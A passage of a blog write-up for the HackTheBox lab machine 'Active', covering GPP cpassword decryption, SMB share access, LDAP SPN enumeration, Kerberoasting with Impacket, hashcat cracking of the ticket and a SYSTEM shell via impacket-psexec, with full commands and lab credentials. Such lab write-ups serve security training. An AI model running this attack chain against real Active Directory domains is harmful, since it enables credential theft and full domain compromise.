</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=access-as-svc_tgs>Access as SVC_TGS<a class=anchor aria-hidden=true href=#access-as-svc_tgs>#</a></h3><h4 id=group-policy-preferences-gpp---password-decrypt>Group Policy Preferences (GPP) - Password Decrypt<a class=anchor aria-hidden=true href=#group-policy-preferences-gpp---password-decrypt>#</a></h4><p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers through Group Policy.</p><p>When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> and that key can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p><p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
</span></span><span class=line><span class=cl>GPPstillStandingStrong2k18
</span></span></code></pre></div><h4 id=users-share>Users Share<a class=anchor aria-hidden=true href=#users-share>#</a></h4><p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ crackmapexec smb active.htb -u <span class=s1>&#39;SVC_TGS&#39;</span> -p <span class=s1>&#39;GPPstillStandingStrong2k18&#39;</span> --shares
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows 6.1 Build <span class=m>7601</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:active.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> active.htb<span class=se>\S</span>VC_TGS:GPPstillStandingStrong2k18 
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               C$                              Default share
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               IPC$                            Remote IPC
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               Replication     READ            
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               SYSVOL          READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         10.10.10.100    <span class=m>445</span>    DC               Users           READ  
</span></span></code></pre></div><p>Looking into the <code>Users</code> share, I&rsquo;m sure this share is <code>C:\Users\</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ smbclient -N //10.10.10.100/Users -U <span class=s1>&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                  DR        <span class=m>0</span>  Sat Jul <span class=m>21</span> 10:39:20 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ..                                 DR        <span class=m>0</span>  Sat Jul <span class=m>21</span> 10:39:20 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Administrator                       D        <span class=m>0</span>  Mon Jul <span class=m>16</span> 06:14:21 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  All Users                       DHSrn        <span class=m>0</span>  Tue Jul <span class=m>14</span> 01:06:44 <span class=m>2009</span>
</span></span><span class=line><span class=cl>  Default                           DHR        <span class=m>0</span>  Tue Jul <span class=m>14</span> 02:38:21 <span class=m>2009</span>
</span></span><span class=line><span class=cl>  Default User                    DHSrn        <span class=m>0</span>  Tue Jul <span class=m>14</span> 01:06:44 <span class=m>2009</span>
</span></span><span class=line><span class=cl>  desktop.ini                       AHS      <span class=m>174</span>  Tue Jul <span class=m>14</span> 00:57:55 <span class=m>2009</span>
</span></span><span class=line><span class=cl>  Public                             DR        <span class=m>0</span>  Tue Jul <span class=m>14</span> 00:57:55 <span class=m>2009</span>
</span></span><span class=line><span class=cl>  SVC_TGS                             D        <span class=m>0</span>  Sat Jul <span class=m>21</span> 11:16:32 <span class=m>2018</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=m>10459647</span> blocks of size 4096. <span class=m>5722238</span> blocks available
</span></span></code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls SVC_TGS<span class=se>\D</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  .                                   D        <span class=m>0</span>  Sat Jul <span class=m>21</span> 11:14:42 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Sat Jul <span class=m>21</span> 11:14:42 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  user.txt                            A       <span class=m>34</span>  Sat Jul <span class=m>21</span> 11:06:25 <span class=m>2018</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=m>10459647</span> blocks of size 4096. <span class=m>5722238</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> more SVC_TGS<span class=se>\D</span>esktop<span class=se>\u</span>ser.txt
</span></span><span class=line><span class=cl>getting file <span class=se>\S</span>VC_TGS<span class=se>\D</span>esktop<span class=se>\u</span>ser.txt of size <span class=m>34</span> as /tmp/smbmore.uhunaP <span class=o>(</span>0.1 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0.1 KiloBytes/sec<span class=o>)</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210711104959070.png alt=image-20210711104959070></div></p><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-system>Shell as SYSTEM<a class=anchor aria-hidden=true href=#shell-as-system>#</a></h3><h4 id=ldap---spn-enumeration>LDAP - SPN enumeration<a class=anchor aria-hidden=true href=#ldap---spn-enumeration>#</a></h4><p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service. It was found that the administrator has the <code>servicePrincipalName</code> (SPN) attribute set.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -x -D <span class=s1>&#39;SVC_TGS@active.htb&#39;</span> -w <span class=s1>&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span class=s2>&#34;dc=active,dc=htb&#34;</span> <span class=s2>&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
</span></span><span class=line><span class=cl>dn: <span class=nv>CN</span><span class=o>=</span>Administrator,CN<span class=o>=</span>Users,DC<span class=o>=</span>active,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>adminCount: <span class=m>1</span>
</span></span><span class=line><span class=cl>accountExpires: <span class=m>0</span>
</span></span><span class=line><span class=cl>logonCount: <span class=m>34</span>
</span></span><span class=line><span class=cl>sAMAccountName: Administrator
</span></span><span class=line><span class=cl>sAMAccountType: <span class=m>805306368</span>
</span></span><span class=line><span class=cl>servicePrincipalName: active/CIFS:445
</span></span><span class=line><span class=cl>objectCategory: <span class=nv>CN</span><span class=o>=</span>Person,CN<span class=o>=</span>Schema,CN<span class=o>=</span>Configuration,DC<span class=o>=</span>active,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h4 id=kerberoasting>Kerberoasting<a class=anchor aria-hidden=true href=#kerberoasting>#</a></h4><p>If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called <strong>Kerberoasting</strong>. It is an attack against Kerberos to steal a <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_b4041466-ae24-4fd4-83e4-5dbc4f32aaab>Service Ticket</a> (ST).</p><p>The attack is well explained in <a href=https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/>this blog</a> and <a href=https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5>this one</a>, but I will try to give an overview using the following image created by <a href=http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf>David Freimannis</a>. The <strong>Kerberoasting</strong> attack indicated by a red box starting from step number 3.</p><p><div class=img-container><img src=imgs/image-20210715120848088.png alt=image-20210715120848088 title="Kerberos Mechanism"></div></p><center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center><p>Using this case, I want to access a CIFS service, so I need to ask the server (KDC) for it. The server will then search for the SPN of the CIFS service, which is <code>active/CIFS:445</code>, and that SPN is registered to the administrator account. Once the SPN is found, the server will issue a TGS (Ticket Granting Service) encrypted with NTLM hash (derived from password) of the administrator account and send that to the requester which is me. Now that I have TGS for the CIFS service, but instead of using (forwarding) this ticket to authenticate to the corresponding service, I keep the ticket and attempt a brute-force attack against it to recover the administrator password.</p><blockquote><p>If the SPN is registered to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p></blockquote><p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll use the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tool captures the ticket and automatically formats it into hashcat crackable format.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ impacket-GetUserSPNs active.htb/SVC_TGS:<span class=s1>&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
</span></span><span class=line><span class=cl>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span class=line><span class=cl>active/CIFS:445       Administrator  <span class=nv>CN</span><span class=o>=</span>Group Policy Creator Owners,CN<span class=o>=</span>Users,DC<span class=o>=</span>active,DC<span class=o>=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>Administrator<span class=nv>$ACTIVE</span>.HTB<span class=nv>$active</span>.htb/Administrator*<span class=nv>$92</span>c75d0a49cbaf166e656a7350827d0c<span class=nv>$a775e30</span>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h4 id=tgs-crack>TGS Crack<a class=anchor aria-hidden=true href=#tgs-crack>#</a></h4><p>The password of from the obtained TGS can be recovered using hashcat.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./hashcat.exe -m <span class=m>13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>Administrator<span class=nv>$ACTIVE</span>.HTB<span class=nv>$active</span>.htb/Administrator*<span class=nv>$92</span>c75d0a49cbaf166e656a7350827d0c<span class=nv>$a775e30</span>...<span class=o>[</span>SNIP<span class=o>]</span>...:Ticketmaster1968
</span></span></code></pre></div><p>It is <code>Ticketmaster1968</code>.</p><h4 id=impacket-psexec>Impacket-psexec<a class=anchor aria-hidden=true href=#impacket-psexec>#</a></h4><p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ impacket-psexec active.htb/administrator:<span class=s1>&#39;Ticketmaster1968&#39;</span>@10.10.10.100
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.10.10.100.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file olAAJsqj.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.10.10.100.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service mvjR on 10.10.10.100.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service mvjR.....
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami <span class=o>&amp;&amp;</span> ipconfig
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Windows IP Configuration
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ethernet adapter Local Area Connection:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . : 
</span></span><span class=line><span class=cl>   IPv4 Address. . . . . . . . . . . : 10.10.10.100
</span></span><span class=line><span class=cl>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class=line><span class=cl>   Default Gateway . . . . . . . . . : 10.10.10.2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Tunnel adapter isatap.<span class=o>{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span class=o>}</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Media State . . . . . . . . . . . : Media disconnected
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . : 
</span></span></code></pre></div><p>The root flag is done here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;type <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\r</span>oot.txt
</span></span><span class=line><span class=cl>b5fc76...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href="https://adsecurity.org/?p=2288" target=_blank rel="noopener noreferrer">https://adsecurity.org/?p=2288</a></li><li><a href=https://hebo.gitbook.io/hackbook/active-directory/kerberoasting target=_blank rel="noopener noreferrer">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li><li><a href=https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/ target=_blank rel="noopener noreferrer">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li><li><a href=http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf target=_blank rel="noopener noreferrer">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/active-directory/>Active-Directory</a></li><li><a href=https://fahmifj.github.io/tags/kerberoasting/>Kerberoasting</a></li><li><a href=https://fahmifj.github.io/tags/gpp-decrypt/>gpp-decrypt</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Active on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Active&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2factive%2f&hashtags=Windows%2cActive-Directory%2cKerberoasting%2cgpp-decrypt"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Active on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2factive%2f&title=HackTheBox%20-%20Active&summary=HackTheBox%20-%20Active&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2factive%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Active on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2factive%2f&title=HackTheBox%20-%20Active"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Active on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2factive%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Active on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Active%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2factive%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Active on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Active&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2factive%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>